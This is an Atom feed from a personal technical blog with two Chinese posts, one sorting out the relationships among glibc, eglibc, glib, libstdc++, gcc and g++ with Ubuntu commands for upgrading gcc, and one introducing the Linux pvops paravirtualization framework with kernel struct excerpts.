<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Diting0x</title>
  <subtitle>Keep Me Alive</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2016-05-25T14:46:56.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Diting0x</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>理清编译链接的那些事儿</title>
    <link href="http://yoursite.com/blog/2016/05/25/lib-compile-link/"/>
    <id>http://yoursite.com/blog/2016/05/25/lib-compile-link/</id>
    <published>2016-05-25T14:42:40.000Z</published>
    <updated>2016-05-25T14:46:56.000Z</updated>
    
    <content type="html">&lt;p&gt;当你在linux下写C/C++代码的时候，是不是会遇到许多编译链接的问题？ 时不时报个glibc,gcc，g++等相关的错误？ 很多时候都无从下手，而且比较混乱。 这也是编译链接过程中经常出现的问题。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;这篇文章不是去介绍如何编译链接，而是理清编译链接过程中碰到的一些概念和出现的问题。尤其是，libc,,glib,glibc,eglibc，libc++，libstdc++，gcc,g++。 &lt;/p&gt;
&lt;p&gt;从libc说起。&lt;br&gt;libc是Linux下原来的标准C库，也就是当初写hello world时包含的头文件#include &amp;lt; stdio.h&gt; 定义的地方。 &lt;/p&gt;
&lt;p&gt;后来逐渐被glibc取代，也就是传说中的GNU C Library,在此之前除了有libc，还有klibc,uclibc。现在只要知道用的最多的是glibc就行了，主流的一些linux操作系统如 Debian, Ubuntu，Redhat等用的都是glibc（或者其变种，下面会说到).&lt;/p&gt;
&lt;p&gt;那glibc都做了些什么呢？ glibc是Linux系统中最底层的API，几乎其它任何的运行库都要依赖glibc。 glibc最主要的功能就是对系统调用的封装，你想想看，你怎么能在C代码中直接用fopen函数就能打开文件？ 打开文件最终还是要触发系统中的sys_open系统调用，而这中间的处理过程都是glibc来完成的。&lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/08/linux-syscalls/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;详细介绍了glibc是如何与上层应用程序和系统调用交互的。除了封装系统调用，glibc自身也提供了一些上层应用函数必要的功能,如string,malloc,stdlib,linuxthreads,locale,signal等等。&lt;/p&gt;
&lt;p&gt;好了，那eglibc又是什么？ 这里的e是Embedded的意思，也就是前面说到的变种glibc。eglibc的主要特性是为了更好的支持嵌入式架构，可以支持不同的shell(包括嵌入式)，但它是二进制兼容glibc的，就是说如果你的代码之前依赖eglibc库，那么换成glibc后也不需要重新编译。ubuntu系统用的就是eglibc（而不是glibc）,不信，你执行 ldd –version 或者 /lib/i386-linux-gnu/libc.so.6&lt;br&gt;(64位系统运行/lib/x86_64-linux-gnu）看看，便会显示你系统中eglibc/glibc的版本信息。  这里提到了libc.so.6,这个文件就是eglibc/glibc编译后的生成库文件。&lt;/p&gt;
&lt;p&gt;好了，还有一个glib看起来也很相似，那它又是什么呢？glib也是个c程序库，不过比较轻量级，glib将C语言中的数据类型统一封装成自己的数据类型，提供了C语言常用的数据结构的定义以及处理函数，有趣的宏以及可移植的封装等(注：glib是可移植的，说明你可以在linux下，也可以在windows下使用它）。那它跟glibc有什么关系吗？其实并没有，除非你的程序代码会用到glib库中的数据结构或者函数，glib库在ubuntu系统中并不会默认安装(可以通过apt-get install libglib2.0-dev手动安装)，著名的GTK+和Gnome底层用的都是glib库。想更详细了解glib？ 可以参考 &lt;a href=&quot;https://developer.gnome.org/glib/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看到这里，你应该知道这些库有多重要了吧？ 你写的C代码在编译的过程中有可能出现明明是这些库里面定义的变,却量还会出现’Undefined’, ‘Unreference’等错误，这时候你可能会怀疑是不是这些库出问题了？ 是不是该动手换个gilbc/eglibc了？ 这里强调一点，在你准备更换/升级这些库之前，你应该好好思考一下，你真的要更换/升级吗？你要知道你自己在做什么！你要时刻知道glibc/eglibc的影响有多大，不管你之前部署的什么程序，linux系统的ls,cd,mv,ps等等全都得依赖它，很多人在更换/升级都有过惨痛的教训，甚至让整个系统奔溃无法启动。所以，强烈不建议更换/升级这些库！&lt;/p&gt;
&lt;p&gt;当然如果你写的是C++代码，还有两个库也要非常重视了，libc++/libstdc++,这两个库有关系吗？有。两个都是C++标准库。libc++是针对clang编译器特别重写的C++标准库，那libstdc++自然就是gcc的事儿了。libstdc++与gcc的关系就像clang与libc++. 其中的区别这里不作详细介绍了。&lt;/p&gt;
&lt;p&gt;再说说libstdc++，glibc的关系。 libstdc++与gcc是捆绑在一起的，也就是说安装gcc的时候会把libstdc++装上。 那为什么glibc和gcc没有捆绑在一起呢？&lt;br&gt;相比glibc，libstdc++虽然提供了c++程序的标准库，但它并不与内核打交道。对于系统级别的事件，libstdc++首先是会与glibc交互，才能和内核通信。相比glibc来说，libstdc++就显得没那么基础了。&lt;/p&gt;
&lt;p&gt;说完了这些库，这些库最终都是拿来干嘛的？当然是要将它们与你的程序链接在一起！ 这时候就不得不说说gcc了(当然还有前文提到的clang以及llvm等编译器，本文就不细说它们的区别了)。&lt;/p&gt;
&lt;p&gt;你写的C代码.c文件通过gcc首先转化为汇编.S文件，之后汇编器as将.S文件转化为机器代码.o文件，生成的.o文件再与其它.o文件，或者之前提到的libc.so.6库文件通过ld链接器链接在一块生成可执行文件。当然，在你编译代码使用gcc的时候，gcc命令已经帮你把这些细节全部做好了。&lt;/p&gt;
&lt;p&gt;那g++是做什么的? 慢慢说来，不要以为gcc只能编译C代码，g++只能编译c++代码。 后缀为.c的，gcc把它当作是C程序，而g++当作是c++程序；后缀为.cpp的，两者都会认为是c++程序，注意，虽然c++是c的超集，但是两者对语法的要求是有区别的。在编译阶段，g++会调用gcc,对于c++代码，两者是等价的，但是因为gcc命令不能自动和C++程序使用的库联接，需要这样，gcc -lstdc++, 所以如果你的Makefile文件并没有手动加上libstdc++库，一般就会提示错误，要求你安装g++编译器了。&lt;/p&gt;
&lt;p&gt;好了，就说到这，理清这些库与编译器之间的关系，相信会对你解决编译链接过程中遇到的错误起到一点帮助。&lt;/p&gt;
&lt;p&gt;如果你的编译器不支持一些新的C/C++特性，想升级gcc/g++, 这里也给出一个基于ubuntu系统的参考方法。&lt;/p&gt;
&lt;p&gt;添加ppa&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo add-apt-repository ppa:ubuntu-toolchain-r/test
sudo apt-get update
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;添加ppa，是因为你所用的ubuntu版本的更新源中可能并没有你想要的gcc/g++版本。&lt;/p&gt;
&lt;p&gt;安装新版gcc/g++&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install gcc-4.8
sudo apt-get install g++-4.8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以到/usr/bin/gcc查看新安装的gcc,g++&lt;/p&gt;
&lt;p&gt;配置系统gcc/g++&lt;/p&gt;
&lt;p&gt;使用update-alternatives,统一更新gcc/g++&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.6 60 --slave /usr/bin/g++ g++ /usr/bin/g++-4.6
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 80 --slave /usr/bin/g++ g++ /usr/bin/g++-4.8
sudo update-alternatives --config gcc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数字优先级(如60，80)高的会被系统选择为默认的编译器,也可以执行第三条命令就是来手动配置系统的gcc,此处按照提示,选择4.8版本的即可。&lt;/p&gt;
&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;仅为学习使用，未经博主同意，请勿转载&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://localhost:4000/blog/2016/05/25/lib-compile-link/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:4000/blog/2016/05/25/lib-compile-link/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者 &lt;a href=&quot;http://weibo.com/diting0x/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;新浪微博：@diting0x&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;当你在linux下写C/C++代码的时候，是不是会遇到许多编译链接的问题？ 时不时报个glibc,gcc，g++等相关的错误？ 很多时候都无从下手，而且比较混乱。 这也是编译链接过程中经常出现的问题。&lt;/p&gt;
    
    </summary>
    
      <category term="System" scheme="http://yoursite.com/categories/System/"/>
    
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Compiler" scheme="http://yoursite.com/tags/Compiler/"/>
    
  </entry>
  
  <entry>
    <title>PVOPS 框架介绍</title>
    <link href="http://yoursite.com/blog/2016/05/03/pvops/"/>
    <id>http://yoursite.com/blog/2016/05/03/pvops/</id>
    <published>2016-05-04T00:22:46.000Z</published>
    <updated>2016-05-04T00:48:13.000Z</updated>
    
    <content type="html">&lt;p&gt;pvops是做什么的？ 简单地说，hook kernel.&lt;br&gt;利用pvops你可以自定义自己的write_cr3函数，你可以修改页表，追踪页表更新的信息，而这些听起来非常底层的操作，利用pvops都变得简单起来。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;pvops接口来源于Xen项目，初衷是建立一个类虚拟化(para-virtualized）内核来适应于不同的hypervisor，当然也包括适应于非虚拟化平台。&lt;/p&gt;
&lt;p&gt;pvops将类虚拟化操作分成一系列结构：pv_time_ops,pv_cpu_ops,pv_mmu_ops,pv_lock_ops和pv_irq_ops。&lt;/p&gt;
&lt;p&gt;举个例子，x86系统中利用’MOV CR3’指令来加载页表。pvops将其替换为一个间接跳转到pv_mmu_ops -&amp;gt; write_cr3函数。 每种虚拟化系统，包括本地x86平台，对这些函数都有自己的实现。 对于x86平台，这些函数的实现只是简单地对原始函数指令的封装。比如对于pv_mmu_ops -&amp;gt; write_cr3函数，x86平台的具体实现为native_write_cr3函数：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;static inline void native_write_cr3(unsigned long val)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        asm volatile(&quot;mov %0,%%cr3&quot;: : &quot;r&quot; (val), &quot;m&quot; (__force_order));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;pvops将本地底层的硬件指令通过pv_xxx_ops结构体替换为间接跳转函数。下面以pv_mmu_ops为例，详细分析其内部结构，pv_mmu_ops的定义为：(文中列出主要部分，完整定义，可参看&lt;a href=&quot;http://lxr.free-electrons.com/source/arch/x86/kernel/paravirt.c#L395&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pv_mmu_ops结构定义&lt;/a&gt;）&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; pv_mmu_ops &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(*read_cr2)&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*write_cr2)(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(*read_cr3)&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*write_cr3)(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          * Hooks for intercepting the creation/use/destruction of an&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          * mm_struct.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*activate_mm)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *prev,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *next);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*dup_mmap)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *oldmm,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*exit_mmap)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;/* TLB operations */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*flush_tlb_user)(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*flush_tlb_kernel)(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*flush_tlb_single)(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*flush_tlb_others)(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; cpumask *cpus,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; start,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; end);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;/* Hooks for allocating and freeing a pagetable top-level */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;  (*pgd_alloc)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*pgd_free)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;pgd_t&lt;/span&gt; *pgd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          * Hooks for allocating/releasing pagetable pages when they&#39;re&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          * attached to a pagetable&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*alloc_pte)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*alloc_pmd)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*alloc_pud)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*release_pte)(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*release_pmd)(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*release_pud)(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pfn);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;/* Pagetable manipulation functions */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*set_pte)(&lt;span class=&quot;keyword&quot;&gt;pte_t&lt;/span&gt; *ptep, &lt;span class=&quot;keyword&quot;&gt;pte_t&lt;/span&gt; pteval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*set_pte_at)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; addr,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;span class=&quot;keyword&quot;&gt;pte_t&lt;/span&gt; *ptep, &lt;span class=&quot;keyword&quot;&gt;pte_t&lt;/span&gt; pteval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*set_pmd)(&lt;span class=&quot;keyword&quot;&gt;pmd_t&lt;/span&gt; *pmdp, &lt;span class=&quot;keyword&quot;&gt;pmd_t&lt;/span&gt; pmdval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*set_pmd_at)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; addr,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;span class=&quot;keyword&quot;&gt;pmd_t&lt;/span&gt; *pmdp, &lt;span class=&quot;keyword&quot;&gt;pmd_t&lt;/span&gt; pmdval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*pte_update)(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; mm_struct *mm, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; addr,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;span class=&quot;keyword&quot;&gt;pte_t&lt;/span&gt; *ptep);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
